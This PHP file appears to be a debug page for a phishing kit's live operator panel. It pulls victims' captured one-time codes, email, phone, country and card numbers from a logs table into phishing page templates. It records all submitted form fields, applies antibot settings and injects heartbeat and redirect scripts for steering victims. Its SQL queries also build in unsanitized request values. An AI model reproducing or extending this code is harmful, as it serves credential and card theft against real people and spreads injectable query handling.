<?php

//error_reporting(E_ALL);
//ini_set('display_errors', '1');

include "../cors.php";
require "../lib/ErrorHandler.php";
require_once '../lib/DB.php';

use Library\DB as DB;

session_start();

$userpassword = $_SESSION['userSessionPass'];
$userID = $_SESSION['userID'];

if(!$userID || !$userpassword){
    ErrorHandler::authError();
}

// Connect to the database
$conn = DB::connect();

// Check connection
if (!$conn) {
    error_log("Connection failed: " . mysqli_connect_error());
    ErrorHandler::serverError();
} 

$user = DB::getUser($conn, $userID);
$user=DB::getUser($conn,$_SESSION['userID']);
if(!$user){
    error_log("Error loading user data: " . mysqli_error($conn));
    ErrorHandler::authError();
}



session_start();


$t = $_GET["token"];

//$P token handler START

//when get exists
if (isset($_GET["page"]) && !empty($_GET["page"]) ) {
    // If conditions are met, do something
    $_SESSION["debugpagecache"] = $_GET["page"];
    $blueprint = $_GET["page"];

  
    
}

//when theres no GET
if (!isset($_GET["page"])) {
echo "no get";
$blueprint =  $_SESSION["debugpagecache"];  

if (!isset($_GET["token"])) {
    $currentUrl = $_SERVER['REQUEST_URI'];

// Use parse_url to extract the path component
$urlParts = parse_url($currentUrl, PHP_URL_PATH);

// Use rtrim to remove trailing slashes, explode to split the path, and end to get the last element
$folders = explode('/', rtrim($urlParts, '/'));
$lastFolder = end($folders);

// Echo the last folder
echo "The last folder from the URL is: " . $lastFolder;

$t = $lastFolder;

}


}


echo $blueprint;
echo "<br>$t.html<br>";
$p = $blueprint;

echo "$p<br>";
//$P END




echo $_SESSION['username'];
$testsession = $_SESSION['username'];

require_once "db.php";

//replace [sentcode1,2,3,4,5's] [conditional error1,2,3]

//fetch page
$sql="SELECT * FROM blueprints INNER JOIN blueprints_tokens ON blueprints.blueprint = blueprints_tokens.blueprint WHERE blueprints.blueprint = '$p' AND pagefile = '$t.html'";
$result = mysqli_query($nodeConn, "SET NAMES utf8");
$result = mysqli_query($nodeConn, $sql);
if (mysqli_num_rows($result) > 0) {
  // output data of each row
  while($row = mysqli_fetch_assoc($result))
  {
     $tokenID=$row["tokenID"];
     $pageID=$row["pageID"];
     $blueprint=$row["blueprint"];
     $pageName=$row["pageName"];
     $enable_redirectpulse=$row["enable_redirectpulse"];
     $pagefile=$row["pagefile"];
     $tokenName=$row["tokenName"];
     $url_cosmetic=$row["url_cosmetic"];
     $exception_antibot=$row["exception_antibot"];
     $url_cosmetic=$row["url_cosmetic"];
     $enable_mobile=$row["url_cosmetic"];
     $wait_lag=$row["wait_lag"];
     $dynamic_a=$row["a"];
     $dynamic_b=$row["b"];
     $dynamic_c=$row["c"];
     $dynamic_x=$row["x"];
     $dynamic_y=$row["y"];
     $z1=$row["z"];
     $mobile_only=$row["mobile_only"];
     $antibot_active=$row["antibot_active"];
     $antibot_passive=$row["antibot_passive"];
     $errorMsg1=$row["errorMsg1"];
     $errorMsg2=$row["errorMsg2"];
     $errorMsg3=$row["errorMsg3"];
     $endUrl=$row["endUrl"];

     echo "enable_redirectpulse: $enable_redirectpulse<br>";
  }
}

  
  $sql = "SELECT * FROM logs_editor WHERE SessionID = '$testsession';";
  $result = mysqli_query($nodeConn, "SET NAMES utf8");
  $result = mysqli_query($nodeConn, $sql);
  if (mysqli_num_rows($result) > 0) {
    // output data of each row
    while($row = mysqli_fetch_assoc($result))
    {

        $sentcode1 = $row['sentcode'];
        $sentcode2 = $row['sentcode2'];
        $sentcode3 = $row['sentcode3'];
        $sentcode4 = $row['sentcode4'];
        $sentcode5 = $row['sentcode5'];
        $show_error = $row['show_error'];
        $email = $row['email_address'];
        $phone = $row['phone'];
        $country = $row['country'];
        $email = $row['email_address'];
        $cc = $row['cardnumber']; //from logs DB
        $username=$row["username"];

        echo $sentcode2;
    
    }
} else {
  // Handle the case when no rows are returned
  echo "No data found for SessionID: $testsession";
  // You can also log this information or take other actions as needed
}



  echo "<br> sql blueprint:$blueprint"; echo $tokenName; echo $errorMsg1; echo $pagefile;

  //show page 

  $htmlContent = file_get_contents("$blueprint/pages/$pagefile");

  // Check if $htmlContent contains a redirect pattern
  if (preg_match('/\[REDIRECT:(.*?):(.*?)\]/', $htmlContent, $matches)) {
      // $matches[1] contains the first string after REDIRECT:
      $firstString = $matches[1];
  
      // $matches[2] contains the second string after REDIRECT:
      $secondString = $matches[2];
  
      echo "First String: $firstString<br>";
      echo "Second String: $secondString<br>";
      //header("Location: ../$firstString/$secondString"); version for the real one
      header("Location: debug.php/?page=$firstString&token=$secondString");
    
   
  
      // Add your redirect logic here, if needed
      // header("Location: $firstString"); 
  } else {
      // No redirect pattern found
      echo "No redirect specified in the content.";
  }
   

$htmlContent = preg_replace('/\[REDIRECT:(.*?)\]/', '', $htmlContent);

$htmlContent = str_replace(
  ['[ID]', '[USERNAME]', '[PHONE]', '[COUNTRY]', '[EMAIL]', '[CC]', '[IP]', '[DEVICE]', '[CHALLENGE1]', '[CHALLENGE2]', '[CHALLENGE3]', '[CHALLENGE4]', '[CHALLENGE5]', '[ERROR1]', '[ERROR2]', '[ERROR3]', '[A]', '[B]', '[C]', '[X]', '[Y]', '[Z]', '[END10]', '[END20]', '[END0]'],
  [$testsession, $username, $phone, $country, $email, $cc, $ip, $os, $sentcode1, $sentcode2, $sentcode3, $sentcode4, $sentcode5, $errorMsg1, $errorMsg2, $errorMsg3, $dynamic_a, $dynamic_b, $dynamic_c, $dynamic_x, $dynamic_y, $z1, $end10, $end20, $end0],
  $htmlContent
);


  if ($gosign == "true" || "free"){
    echo $htmlContent;
  }








//session creator

//post handlers START

// ...

// Iterate through each posted item
// Reverse the $_POST array
$reversedPost = array_reverse($_POST);

// Iterate through each posted item in reverse order
foreach ($reversedPost as $key => $value) {
    // Do something with the key and value, for example, print them
    echo "POST: $key, Value: $value <br> <script>console.log('$value posted FROM $key')</script>";

    $testsession = $_SESSION['username'];
    $characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $random = substr(str_shuffle($characters), 0, 5);

    // Construct the SQL query
    $sql = "INSERT INTO respons_editor (sessionID, respons, responsID, type)
            VALUES ('$testsession', '$value', '$random', '$key')";

    // Execute the query
    if (mysqli_query($conn, $sql)) {
        echo "Record inserted successfully";
    } else {
        echo "Error inserting record: " . mysqli_error($conn);
    }
} 

//POST handlers END

//POST handler UPDATES

//redirect pulse

//updatekey

//heartbeat

$z = $_SESSION['username'];
$pulse = file_get_contents("scripts/pulses.html");
$pulse = str_replace("[ID]", $z, $pulse);
echo $pulse;



//insert If statement here below checking if enable_redirect is enabled [ ]
{
  $z = $_SESSION['username'];
  $redirectpulse = file_get_contents("scripts/redirectpulse.html");
  $redirectpulse = str_replace("[ID]", $z, $redirectpulse);
  $redirectpulse = str_replace("[BLUEPRINT]", $blueprint, $redirectpulse);
  echo $redirectpulse;
}


echo "-----";
?>
<div id="x"></div>



